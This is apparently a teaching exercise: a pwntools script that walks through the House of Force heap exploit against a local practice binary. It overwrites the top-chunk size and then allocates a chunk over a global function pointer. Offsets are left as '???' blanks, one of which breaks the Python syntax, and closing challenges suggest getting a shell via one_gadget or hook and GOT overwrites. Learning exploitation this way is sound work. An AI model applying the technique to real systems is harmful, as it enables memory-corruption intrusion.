#!/usr/bin/env python3
from pwn import *
from struct import pack, unpack
exe = context.binary = ELF('./house_of_force')

def menu(r, choice):
    r.recvuntil(b'> ')
    r.sendline(str(choice).encode())

def leak(r):
    menu(r, 0)
    r.recvuntil(b'something.\n')
    leak = []
    r.recvuntil(b'do_nothing: ')
    leak.append(int(r.recvline().decode(), base=16))
    r.recvuntil(b'do_something: ')
    leak.append(int(r.recvline().decode(), base=16))
    return leak

def malloc(r, index, size):
    menu(r, 1)
    r.recvuntil(b'allocate?\n> ')
    r.sendline(str(index).encode())

    resp = r.recvline()
    if b'What size' not in resp:
        log.warn(f'malloc(r, {index}, {size}) failed. Invalid index value.')
        return
    r.recvuntil(b'> ')
    r.sendline(str(size).encode())

    resp = r.recvline()
    if b'address' not in resp:
        log.warn(f'malloc(r, {index}, {size}) failed. Invalid size value.')
        return

    chunk = resp.split(b':')[1].strip()
    chunk = int(chunk, base=16)
    return chunk
    
def write_chunk(r, index, data):
    menu(r, 2)
    r.recvuntil(b'write to?\n> ')
    r.sendline(str(index).encode())

    resp = r.recvline()
    if b'Now enter' not in resp:
        log.warn(f'write_chunk(r, {index}, {data}) failed. Invalid index value.')
        return

    r.recvuntil(b'> ')
    r.sendline(data)

def do_nothing(r):
    menu(r, 3)
    resp = r.recvline()
    print(f'Do nothing output: \"{resp}\"')

def quit(r):
    menu(r, 4)

io = exe.process()

# allocate one chunk to see where it is at
chunk1_size = 20
chunk1_address = malloc(io, 0, chunk1_size)

# Output our chunk to make sure it is on the heap
log.info(f'Chunk 1 allocated to {hex(chunk1_address)}')

# now we open gdb to see how far our chunk is from the heap of the base
# using the command `vmmap` we can see where the heap begins and calculate
# the base address of the heap (if we ever wanted to use it)

chunk1_base_offset = 0 # ???

heap_base = chunk1_address - chunk1_base_offset

# we also want to find the location of the wilderness, so we know how much
# to overflow the heap by and where we want to write our fake size.
# an example gdb output is shown below
"""
gdb> x/6gx 0x5d40380912a0 - 0x8 

0x5d4038091298:	0x0000000000000021	0x0000000000000000 <-- left column is chunk1's metadata
                                                               right is beginning of where we can 
                                                               write
0x5d40380912a8:	0x0000000000000000	0x0000000000000000


0x5d40380912b8:	0x0000000000020d51	0x0000000000000000 <-- left column is wilderness
                                                               size left
"""
# in the case above, the user can write 24 bytes before the buffer is
# overflowed and the wilderness chunk is overwritten. We want to make
# the wilderness size chunk as big as possible, which in a 64-bit
# binary would be 0xffffffffffffffff

chunk1_buffer_size = 0 # ???

payload = b'\x00' * chunk1_buffer_size + b'\xff'*8
write_chunk(io, 0, payload)

# now if we do the same gdb command, we should see our wilderness chunk
# size be very large (also not that it is unsigned, all malloc inputs are
# read as unsigned values)

"""
x/6gx 0x619e612832a0 - 0x8
0x619e61283298:	0x0000000000000021	0x0000000000000000
0x619e612832a8:	0x0000000000000000	0x0000000000000000
0x619e612832b8:	0xffffffffffffffff	0x000000000000000a <-- left column value is what we like
"""

# for the attack we will demonstrate, we simply want to change the value
# of the global variable func from do_nothing to do_something. For this,
# we have to know where func is. Luckily, pwntools takes care of this
# for us:
func_address = exe.symbols['func']
log.info(f'func @ {hex(func_address)}')
# sidenote: if you wanted to, you could go into gdb and type `p func` and
# should show you the address of func

# now we will allocate our chunk so that it is right before the `func` address,
# so when we allocate the third chunk and write to it, we are overwriting
# the function pointer stored at &func.

delta = 0 ???

bad_chunk_size = unpack('<q',
                        pack('<Q',
                             (1<<64) - (chunk1_address - func_address + delta)
                             )
                        )[0]

log.info(f'{bad_chunk_size}')
bad_chunk_addr = malloc(io, 1, bad_chunk_size)

# now, malloc should think our next chunk is supposed to be allocated
# somewhere around our function. So, we allocate another chunk and we can
# see how close we are to func, then write a new function address to
# func
arbitrary_write_addr = malloc(io, 2, 20)
diff = func_address - arbitrary_write_addr
if diff < 0:
    log.warn('Caution: you went too far, consider changing bad chunk size')

payload = 0 # ???

write_chunk(io, 2, payload)

io.interactive()


# For an extra challenge try these attacks:
# - Change the `-no-pie` flag in the makefile to -fPIC 
# - Overwrite the address of func to a one_gadget and get a shell
# - Overwite __malloc_hook with a one_gadget
# - Overwrite the plt/got entry of free to get a shell
